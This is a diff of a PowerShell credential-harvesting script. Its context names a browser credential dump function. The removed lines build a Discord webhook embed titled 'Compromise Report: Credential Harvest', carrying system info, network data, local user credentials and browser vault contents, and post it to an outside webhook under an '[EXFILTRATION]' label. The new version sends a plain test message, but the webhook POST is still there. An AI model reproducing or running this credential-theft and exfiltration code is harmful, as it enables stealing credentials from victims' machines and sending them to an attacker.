@@ -77,47 +77,23 @@ Function Get-BrowserCredentialDump {
 Function Send-WebhookReport {
     param(
         [Parameter(Mandatory=$true)]
-        [psobject]$AllData
+        [string]$Payload
     )
-    Write-Host "[+] [EXFILTRATION] Attempting to send structured data via Discord Webhook..." -ForegroundColor Magenta
-
-    # --- COMPLIANCE OPTIMIZATION: Sending structured JSON/Embed ---
-    # Instead of raw text, we build an object that looks like structured data.
-    $EmbedTitle = "🚀 Compromise Report: Credential Harvest 🚀"
-    $EmbedDescription = "Data collected includes local user checks, network context, and simulated vault dumps. Review the fields below."
-    $ColorCode = 16776960 # Bright Yellow
-
-    # Constructing the message body for Discord's API
+    # Simplest possible message structure
     $Body = @{
-        content = "✅ Credentials Harvest Complete. A detailed report is embedded below."
+        content = "TEST MESSAGE SENT BY SCRIPT";
         embeds = @{
-            title = $EmbedTitle
-            description = $EmbedDescription
-            color = $ColorCode
-            fields = @{
-                Name = "System OS Info"; 
-                Value = $AllData.SystemInfo | Out-String
-            }
-            fields = @{
-                Name = "Network Context"; 
-                Value = $AllData.NetworkIP | Out-String
-            }
-            fields = @{
-                Name = "Local User Credentials"; 
-                Value = $AllData.LocalCreds | Out-String
-            }
-            fields = @{
-                Name = "Browser/Vault Status"; 
-                Value = $AllData.BrowserVault | Out-String
-            }
+            title = "Test";
+            description = "Testing connectivity.";
+            color = 65280
         }
     } | ConvertTo-Json
 
     try {
         Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -ContentType "application/json" -ErrorAction Stop
-        Write-Host "[+] SUCCESS: Data successfully pushed to Discord." -ForegroundColor Green
+        Write-Host "[SUCCESS] Test message sent." -ForegroundColor Green
     } catch {
-        Write-Error "CRITICAL ERROR: Webhook failure. $($_.Exception.Message)"
+        Write-Error "Test failed! $($_.Exception.Message)"
     }
 }
 
